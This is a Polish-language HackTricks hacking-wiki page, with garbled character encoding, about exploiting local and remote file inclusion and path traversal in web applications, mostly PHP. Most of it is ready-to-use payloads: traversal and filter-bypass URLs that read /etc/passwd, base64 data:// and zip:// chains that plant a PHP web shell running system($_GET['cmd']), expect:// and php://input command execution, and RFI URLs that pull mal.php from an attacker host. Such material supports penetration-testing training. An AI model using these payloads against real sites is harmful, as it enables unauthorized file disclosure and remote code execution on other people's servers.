# File Inclusion/Path traversal

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serwera, aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hackerami i Å‚owcami bugÃ³w!

**WglÄ…d w Hacking**\
ZaangaÅ¼uj siÄ™ w treÅ›ci, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania zwiÄ…zane z hackingiem

**AktualnoÅ›ci Hackingowe w Czasie Rzeczywistym**\
BÄ…dÅº na bieÅ¼Ä…co z dynamicznym Å›wiatem hackingu dziÄ™ki aktualnym wiadomoÅ›ciom i wglÄ…dom

**Najnowsze OgÅ‚oszenia**\
BÄ…dÅº informowany o najnowszych programach bug bounty oraz istotnych aktualizacjach platformy

**DoÅ‚Ä…cz do nas na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hackerami juÅ¼ dziÅ›!

## File Inclusion

**Remote File Inclusion (RFI):** Plik jest Å‚adowany z zdalnego serwera (Najlepiej: MoÅ¼esz napisaÄ‡ kod, a serwer go wykona). W php jest to **wyÅ‚Ä…czone** domyÅ›lnie (**allow\_url\_include**).\
**Local File Inclusion (LFI):** Serwer Å‚aduje lokalny plik.

Luka wystÄ™puje, gdy uÅ¼ytkownik moÅ¼e w jakiÅ› sposÃ³b kontrolowaÄ‡ plik, ktÃ³ry ma byÄ‡ zaÅ‚adowany przez serwer.

Vulnerable **funkcje PHP**: require, require\_once, include, include\_once

InteresujÄ…ce narzÄ™dzie do wykorzystania tej luki: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**MieszajÄ…c kilka list LFI dla \*nix i dodajÄ…c wiÄ™cej Å›cieÅ¼ek, stworzyÅ‚em tÄ™:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

SprÃ³buj rÃ³wnieÅ¼ zmieniÄ‡ `/` na `\`\
SprÃ³buj rÃ³wnieÅ¼ dodaÄ‡ `../../../../../`

Lista, ktÃ³ra wykorzystuje kilka technik do znalezienia pliku /etc/password (aby sprawdziÄ‡, czy luka istnieje), znajduje siÄ™ [tutaj](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

PoÅ‚Ä…czenie rÃ³Å¼nych list sÅ‚Ã³w:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

SprÃ³buj rÃ³wnieÅ¼ zmieniÄ‡ `/` na `\`\
SprÃ³buj rÃ³wnieÅ¼ usunÄ…Ä‡ `C:/` i dodaÄ‡ `../../../../../`

Lista, ktÃ³ra wykorzystuje kilka technik do znalezienia pliku /boot.ini (aby sprawdziÄ‡, czy luka istnieje), znajduje siÄ™ [tutaj](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

SprawdÅº listÄ™ LFI dla linux.

## Podstawowe LFI i obejÅ›cia

Wszystkie przykÅ‚ady dotyczÄ… Local File Inclusion, ale mogÄ… byÄ‡ rÃ³wnieÅ¼ zastosowane do Remote File Inclusion (strona=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### sekwencje przejÅ›cia usuniÄ™te nienawrotowo
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

OminiÄ™cie dodawania wiÄ™cej znakÃ³w na koÅ„cu podanego ciÄ…gu (ominiÄ™cie: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
To jest **rozwiÄ…zane od PHP 5.4**

### **Kodowanie**

MoÅ¼esz uÅ¼ywaÄ‡ niestandardowych kodowaÅ„, takich jak podwÃ³jne kodowanie URL (i inne):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Z istniejÄ…cego folderu

MoÅ¼e backend sprawdza Å›cieÅ¼kÄ™ folderu:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Badanie katalogÃ³w systemu plikÃ³w na serwerze

System plikÃ³w serwera moÅ¼na badaÄ‡ rekurencyjnie, aby zidentyfikowaÄ‡ katalogi, a nie tylko pliki, stosujÄ…c okreÅ›lone techniki. Proces ten polega na ustaleniu gÅ‚Ä™bokoÅ›ci katalogu i sprawdzeniu istnienia konkretnych folderÃ³w. PoniÅ¼ej znajduje siÄ™ szczegÃ³Å‚owa metoda, aby to osiÄ…gnÄ…Ä‡:

1. **Ustal gÅ‚Ä™bokoÅ›Ä‡ katalogu:** Ustal gÅ‚Ä™bokoÅ›Ä‡ swojego bieÅ¼Ä…cego katalogu, skutecznie pobierajÄ…c plik `/etc/passwd` (dotyczy to serwerÃ³w opartych na Linuksie). PrzykÅ‚adowy adres URL moÅ¼e byÄ‡ skonstruowany w nastÄ™pujÄ…cy sposÃ³b, wskazujÄ…c na gÅ‚Ä™bokoÅ›Ä‡ rÃ³wnÄ… trzem:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Probe for Folders:** DoÅ‚Ä…cz nazwÄ™ podejrzanego folderu (np. `private`) do URL, a nastÄ™pnie przejdÅº z powrotem do `/etc/passwd`. Dodatkowy poziom katalogu wymaga zwiÄ™kszenia gÅ‚Ä™bokoÅ›ci o jeden:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpretuj wyniki:** OdpowiedÅº serwera wskazuje, czy folder istnieje:
* **BÅ‚Ä…d / Brak wyjÅ›cia:** Folder `private` prawdopodobnie nie istnieje w okreÅ›lonej lokalizacji.
* **ZawartoÅ›Ä‡ `/etc/passwd`:** ObecnoÅ›Ä‡ folderu `private` jest potwierdzona.
4. **Rekurencyjne badanie:** Odkryte foldery moÅ¼na dalej badaÄ‡ pod kÄ…tem podkatalogÃ³w lub plikÃ³w, uÅ¼ywajÄ…c tej samej techniki lub tradycyjnych metod Local File Inclusion (LFI).

Aby badaÄ‡ katalogi w rÃ³Å¼nych lokalizacjach w systemie plikÃ³w, dostosuj Å‚adunek odpowiednio. Na przykÅ‚ad, aby sprawdziÄ‡, czy `/var/www/` zawiera katalog `private` (zakÅ‚adajÄ…c, Å¼e bieÅ¼Ä…cy katalog znajduje siÄ™ na gÅ‚Ä™bokoÅ›ci 3), uÅ¼yj:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Technika Truncacji ÅšcieÅ¼ki**

Truncacja Å›cieÅ¼ki to metoda stosowana do manipulacji Å›cieÅ¼kami plikÃ³w w aplikacjach internetowych. CzÄ™sto jest uÅ¼ywana do uzyskiwania dostÄ™pu do zastrzeÅ¼onych plikÃ³w poprzez obejÅ›cie pewnych Å›rodkÃ³w bezpieczeÅ„stwa, ktÃ³re dodajÄ… dodatkowe znaki na koÅ„cu Å›cieÅ¼ek plikÃ³w. Celem jest skonstruowanie Å›cieÅ¼ki pliku, ktÃ³ra, po zmianie przez Å›rodek bezpieczeÅ„stwa, nadal wskazuje na poÅ¼Ä…dany plik.

W PHP rÃ³Å¼ne reprezentacje Å›cieÅ¼ki pliku mogÄ… byÄ‡ uznawane za rÃ³wnowaÅ¼ne z powodu natury systemu plikÃ³w. Na przykÅ‚ad:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` i `/etc/passwd/` sÄ… traktowane jako ta sama Å›cieÅ¼ka.
* Gdy ostatnie 6 znakÃ³w to `passwd`, dodanie `/` (tworzÄ…c `passwd/`) nie zmienia docelowego pliku.
* Podobnie, jeÅ›li `.php` jest dodawane do Å›cieÅ¼ki pliku (jak `shellcode.php`), dodanie `/.` na koÅ„cu nie zmieni pliku, do ktÃ³rego uzyskuje siÄ™ dostÄ™p.

Podane przykÅ‚ady pokazujÄ…, jak wykorzystaÄ‡ truncacjÄ™ Å›cieÅ¼ki do uzyskania dostÄ™pu do `/etc/passwd`, powszechnego celu ze wzglÄ™du na jego wraÅ¼liwÄ… zawartoÅ›Ä‡ (informacje o kontach uÅ¼ytkownikÃ³w):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
W tych scenariuszach liczba wymaganych przejÅ›Ä‡ moÅ¼e wynosiÄ‡ okoÅ‚o 2027, ale ta liczba moÅ¼e siÄ™ rÃ³Å¼niÄ‡ w zaleÅ¼noÅ›ci od konfiguracji serwera.

* **UÅ¼ywanie segmentÃ³w kropek i dodatkowych znakÃ³w**: Sekwencje przejÅ›Ä‡ (`../`) poÅ‚Ä…czone z dodatkowymi segmentami kropek i znakami mogÄ… byÄ‡ uÅ¼ywane do nawigacji po systemie plikÃ³w, skutecznie ignorujÄ…c doÅ‚Ä…czone ciÄ…gi przez serwer.
* **OkreÅ›lenie wymaganej liczby przejÅ›Ä‡**: Poprzez prÃ³bÄ™ i bÅ‚Ä…d moÅ¼na znaleÅºÄ‡ dokÅ‚adnÄ… liczbÄ™ sekwencji `../`, ktÃ³re sÄ… potrzebne do nawigacji do katalogu gÅ‚Ã³wnego, a nastÄ™pnie do `/etc/passwd`, zapewniajÄ…c, Å¼e wszelkie doÅ‚Ä…czone ciÄ…gi (jak `.php`) sÄ… neutralizowane, ale poÅ¼Ä…dana Å›cieÅ¼ka (`/etc/passwd`) pozostaje nienaruszona.
* **Zaczynanie od faÅ‚szywego katalogu**: PowszechnÄ… praktykÄ… jest rozpoczÄ™cie Å›cieÅ¼ki od nieistniejÄ…cego katalogu (jak `a/`). Technika ta jest stosowana jako Å›rodek ostroÅ¼noÅ›ci lub w celu speÅ‚nienia wymagaÅ„ logiki analizy Å›cieÅ¼ek serwera.

Podczas stosowania technik skracania Å›cieÅ¼ek kluczowe jest zrozumienie zachowania analizy Å›cieÅ¼ek serwera i struktury systemu plikÃ³w. KaÅ¼dy scenariusz moÅ¼e wymagaÄ‡ innego podejÅ›cia, a testowanie jest czÄ™sto konieczne, aby znaleÅºÄ‡ najskuteczniejszÄ… metodÄ™.

**Ta podatnoÅ›Ä‡ zostaÅ‚a naprawiona w PHP 5.3.**

### **Sztuczki omijania filtrÃ³w**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

W php jest to domyÅ›lnie wyÅ‚Ä…czone, poniewaÅ¼ **`allow_url_include`** jest **WyÅ‚Ä…czone.** Musi byÄ‡ **WÅ‚Ä…czone**, aby to dziaÅ‚aÅ‚o, a w takim przypadku moÅ¼esz doÅ‚Ä…czyÄ‡ plik PHP z twojego serwera i uzyskaÄ‡ RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
JeÅ›li z jakiegoÅ› powodu **`allow_url_include`** jest **wÅ‚Ä…czone**, ale PHP **filtruje** dostÄ™p do zewnÄ™trznych stron internetowych, [zgodnie z tym postem](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), moÅ¼esz uÅ¼yÄ‡ na przykÅ‚ad protokoÅ‚u danych z base64, aby zdekodowaÄ‡ kod PHP w b64 i uzyskaÄ‡ RCE:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
W poprzednim kodzie koÅ„cowe `+.txt` zostaÅ‚o dodane, poniewaÅ¼ atakujÄ…cy potrzebowaÅ‚ ciÄ…gu, ktÃ³ry koÅ„czyÅ‚by siÄ™ na `.txt`, wiÄ™c ciÄ…g koÅ„czy siÄ™ tym, a po dekodowaniu b64 ta czÄ™Å›Ä‡ zwrÃ³ci tylko Å›mieci, a prawdziwy kod PHP zostanie doÅ‚Ä…czony (a tym samym, wykonany).
{% endhint %}

Inny przykÅ‚ad **nie uÅ¼ywajÄ…cy protokoÅ‚u `php://`** to: 

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Element gÅ‚Ã³wny Pythona

W Pythonie w kodzie takim jak ten:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
JeÅ›li uÅ¼ytkownik przekaÅ¼e **Å›cieÅ¼kÄ™ absolutnÄ…** do **`file_name`**, **poprzednia Å›cieÅ¼ka zostanie po prostu usuniÄ™ta**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
To jest zamierzona funkcjonalnoÅ›Ä‡ zgodnie z [dokumentacjÄ…](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> JeÅ›li komponent jest Å›cieÅ¼kÄ… bezwzglÄ™dnÄ…, wszystkie poprzednie komponenty sÄ… ignorowane, a Å‚Ä…czenie kontynuuje od komponentu Å›cieÅ¼ki bezwzglÄ™dnej.

## Java Lista KatalogÃ³w

WyglÄ…da na to, Å¼e jeÅ›li masz Path Traversal w Javie i **prosisz o katalog** zamiast pliku, **zwracana jest lista katalogu**. To nie zdarzy siÄ™ w innych jÄ™zykach (o ile mi wiadomo).

## Top 25 parametrÃ³w

Oto lista 25 najwaÅ¼niejszych parametrÃ³w, ktÃ³re mogÄ… byÄ‡ podatne na lokalne wÅ‚Ä…czenie pliku (LFI) (z [linku](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI przy uÅ¼yciu wrapperÃ³w i protokoÅ‚Ã³w PHP

### php://filter

Filtry PHP pozwalajÄ… na wykonanie podstawowych **operacji modyfikacji danych** przed ich odczytem lub zapisaniem. Istnieje 5 kategorii filtrÃ³w:

* [Filtry ciÄ…gÃ³w](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Usuwa tagi z danych (wszystko pomiÄ™dzy znakami "<" i ">")
* ZauwaÅ¼, Å¼e ten filtr zniknÄ…Å‚ z nowoczesnych wersji PHP
* [Filtry konwersji](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : PrzeksztaÅ‚ca do innego kodowania (`convert.iconv.<input_enc>.<output_enc>`). Aby uzyskaÄ‡ **listÄ™ wszystkich obsÅ‚ugiwanych kodowaÅ„**, uruchom w konsoli: `iconv -l`

{% hint style="warning" %}
WykorzystujÄ…c filtr konwersji `convert.iconv.*`, moÅ¼esz **generowaÄ‡ dowolny tekst**, co moÅ¼e byÄ‡ przydatne do pisania dowolnego tekstu lub do stworzenia funkcji, ktÃ³ra wÅ‚Ä…cza proces dowolnego tekstu. Po wiÄ™cej informacji sprawdÅº [**LFI2RCE za pomocÄ… filtrÃ³w PHP**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filtry kompresji](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Kompresuje zawartoÅ›Ä‡ (przydatne, jeÅ›li eksfiltrujesz duÅ¼o informacji)
* `zlib.inflate`: Dekompresuje dane
* [Filtry szyfrowania](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : PrzestarzaÅ‚e
* `mdecrypt.*` : PrzestarzaÅ‚e
* Inne filtry
* UruchamiajÄ…c w PHP `var_dump(stream_get_filters());`, moÅ¼esz znaleÅºÄ‡ kilka **nieoczekiwanych filtrÃ³w**:
* `consumed`
* `dechunk`: odwraca kodowanie chunked HTTP
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,Â£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
CzÄ™Å›Ä‡ "php://filter" jest nieczuÅ‚a na wielkoÅ›Ä‡ liter
{% endhint %}

### UÅ¼ywanie filtrÃ³w php jako oracle do odczytu dowolnych plikÃ³w

[**W tym poÅ›cie**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) zaproponowano technikÄ™ odczytu lokalnego pliku bez zwracania wyniku z serwera. Technika ta opiera siÄ™ na **boole'owskiej eksfiltracji pliku (znak po znaku) przy uÅ¼yciu filtrÃ³w php** jako oracle. Dzieje siÄ™ tak, poniewaÅ¼ filtry php mogÄ… byÄ‡ uÅ¼ywane do powiÄ™kszenia tekstu na tyle, aby php zgÅ‚osiÅ‚ wyjÄ…tek.

W oryginalnym poÅ›cie moÅ¼na znaleÅºÄ‡ szczegÃ³Å‚owe wyjaÅ›nienie techniki, ale oto szybkie podsumowanie:

* UÅ¼yj kodeka **`UCS-4LE`**, aby pozostawiÄ‡ wiodÄ…cy znak tekstu na poczÄ…tku i sprawiÄ‡, Å¼e rozmiar ciÄ…gu wzroÅ›nie wykÅ‚adniczo.
* To bÄ™dzie uÅ¼yte do wygenerowania **tekstu tak duÅ¼ego, gdy poczÄ…tkowa litera jest poprawnie odgadniÄ™ta**, Å¼e php wywoÅ‚a **bÅ‚Ä…d**.
* Filtr **dechunk** **usunie wszystko, jeÅ›li pierwszy znak nie jest szesnastkowy**, wiÄ™c moÅ¼emy wiedzieÄ‡, czy pierwszy znak jest szesnastkowy.
* To, w poÅ‚Ä…czeniu z poprzednim (i innymi filtrami w zaleÅ¼noÅ›ci od odgadniÄ™tej litery), pozwoli nam odgadnÄ…Ä‡ literÄ™ na poczÄ…tku tekstu, widzÄ…c, kiedy wykonujemy wystarczajÄ…co duÅ¼o transformacji, aby nie byÅ‚a znakiem szesnastkowym. PoniewaÅ¼ jeÅ›li jest szesnastkowy, dechunk go nie usunie, a poczÄ…tkowa bomba spowoduje bÅ‚Ä…d php.
* Kodek **convert.iconv.UNICODE.CP930** przeksztaÅ‚ca kaÅ¼dÄ… literÄ™ w nastÄ™pnÄ… (wiÄ™c po tym kodeku: a -> b). To pozwala nam odkryÄ‡, czy pierwsza litera to `a`, na przykÅ‚ad, poniewaÅ¼ jeÅ›li zastosujemy 6 z tego kodeka a->b->c->d->e->f->g, litera nie jest juÅ¼ znakiem szesnastkowym, dlatego dechunk jej nie usunÄ…Å‚, a bÅ‚Ä…d php jest wywoÅ‚ywany, poniewaÅ¼ mnoÅ¼y siÄ™ z poczÄ…tkowÄ… bombÄ….
* UÅ¼ywajÄ…c innych transformacji, takich jak **rot13** na poczÄ…tku, moÅ¼liwe jest wyciekniÄ™cie innych znakÃ³w, takich jak n, o, p, q, r (i inne kodeki mogÄ… byÄ‡ uÅ¼ywane do przesuwania innych liter do zakresu szesnastkowego).
* Gdy poczÄ…tkowy znak jest liczbÄ…, naleÅ¼y go zakodowaÄ‡ w base64 i wyciekowaÄ‡ 2 pierwsze litery, aby wyciekÅ‚a liczba.
* Ostatecznym problemem jest zobaczenie **jak wyciekowaÄ‡ wiÄ™cej niÅ¼ poczÄ…tkowa litera**. UÅ¼ywajÄ…c filtrÃ³w pamiÄ™ci w kolejnoÅ›ci, takich jak **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE**, moÅ¼liwe jest zmienienie kolejnoÅ›ci znakÃ³w i uzyskanie na pierwszej pozycji innych liter tekstu.
* A aby mÃ³c uzyskaÄ‡ **dalsze dane**, pomysÅ‚ polega na **wygenerowaniu 2 bajtÃ³w danych Å›mieciowych na poczÄ…tku** przy uÅ¼yciu **convert.iconv.UTF16.UTF16**, zastosowaniu **UCS-4LE**, aby **pivotowaÄ‡ z nastÄ™pnymi 2 bajtami**, i **usunÄ…Ä‡ dane aÅ¼ do danych Å›mieciowych** (to usunie pierwsze 2 bajty poczÄ…tkowego tekstu). Kontynuuj to, aÅ¼ osiÄ…gniesz poÅ¼Ä…dany bit do wycieku.

W poÅ›cie wyciekniÄ™to rÃ³wnieÅ¼ narzÄ™dzie do automatycznego wykonania tego: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

Ten wrapper pozwala uzyskaÄ‡ dostÄ™p do deskryptorÃ³w plikÃ³w, ktÃ³re proces ma otwarte. Potencjalnie przydatne do eksfiltracji zawartoÅ›ci otwartych plikÃ³w:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ **php://stdin, php://stdout i php://stderr** do uzyskania dostÄ™pu do **deskryptorÃ³w plikÃ³w 0, 1 i 2** odpowiednio (nie jestem pewien, jak to moÅ¼e byÄ‡ przydatne w ataku)

### zip:// i rar://

PrzeÅ›lij plik Zip lub Rar z PHPShell wewnÄ…trz i uzyskaj do niego dostÄ™p.\
Aby mÃ³c wykorzystaÄ‡ protokÃ³Å‚ rar, **musi byÄ‡ on specjalnie aktywowany**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
ZauwaÅ¼, Å¼e ten protokÃ³Å‚ jest ograniczony przez konfiguracje php **`allow_url_open`** i **`allow_url_include`**

### expect://

Expect musi byÄ‡ aktywowany. MoÅ¼esz wykonaÄ‡ kod uÅ¼ywajÄ…c tego:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

OkreÅ›l swÃ³j Å‚adunek w parametrach POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Plik `.phar` moÅ¼e byÄ‡ wykorzystany do wykonywania kodu PHP, gdy aplikacja webowa korzysta z funkcji takich jak `include` do Å‚adowania plikÃ³w. PoniÅ¼szy fragment kodu PHP ilustruje tworzenie pliku `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Aby skompilowaÄ‡ plik `.phar`, naleÅ¼y wykonaÄ‡ nastÄ™pujÄ…ce polecenie:
```bash
php --define phar.readonly=0 create_path.php
```
Po wykonaniu zostanie utworzony plik o nazwie `test.phar`, ktÃ³ry moÅ¼e byÄ‡ potencjalnie wykorzystany do eksploatacji luk w Local File Inclusion (LFI).

W przypadkach, gdy LFI tylko odczytuje pliki bez wykonywania kodu PHP w ich wnÄ™trzu, za pomocÄ… funkcji takich jak `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, lub `filesize()`, moÅ¼na sprÃ³bowaÄ‡ wykorzystaÄ‡ lukÄ™ w deserializacji. Luka ta jest zwiÄ…zana z odczytem plikÃ³w przy uÅ¼yciu protokoÅ‚u `phar`.

Aby uzyskaÄ‡ szczegÃ³Å‚owe zrozumienie eksploatacji luk w deserializacji w kontekÅ›cie plikÃ³w `.phar`, zapoznaj siÄ™ z dokumentem podanym poniÅ¼ej:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### CVE-2024-2961

MoÅ¼na byÅ‚o naduÅ¼yÄ‡ **dowolnego pliku odczytywanego z PHP, ktÃ³ry obsÅ‚uguje filtry php**, aby uzyskaÄ‡ RCE. SzczegÃ³Å‚owy opis moÅ¼na [**znaleÅºÄ‡ w tym poÅ›cie**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Bardzo szybkie podsumowanie: **3-bajtowy przepeÅ‚nienie** w stercie PHP zostaÅ‚o naduÅ¼yte do **zmiany Å‚aÅ„cucha wolnych kawaÅ‚kÃ³w** o okreÅ›lonym rozmiarze, aby mÃ³c **zapisaÄ‡ cokolwiek w dowolnym adresie**, wiÄ™c dodano hak do wywoÅ‚ania **`system`**.\
MoÅ¼na byÅ‚o alokowaÄ‡ kawaÅ‚ki o okreÅ›lonych rozmiarach, naduÅ¼ywajÄ…c wiÄ™cej filtrÃ³w php.

### WiÄ™cej protokoÅ‚Ã³w

SprawdÅº wiÄ™cej moÅ¼liwych [**protokoÅ‚Ã³w do uwzglÄ™dnienia tutaj**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory i php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) â€” Zapis w pamiÄ™ci lub w pliku tymczasowym (nie jestem pewien, jak to moÅ¼e byÄ‡ przydatne w ataku na wÅ‚Ä…czenie pliku)
* [file://](https://www.php.net/manual/en/wrappers.file.php) â€” DostÄ™p do lokalnego systemu plikÃ³w
* [http://](https://www.php.net/manual/en/wrappers.http.php) â€” DostÄ™p do adresÃ³w URL HTTP(s)
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) â€” DostÄ™p do adresÃ³w URL FTP(s)
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) â€” Strumienie kompresji
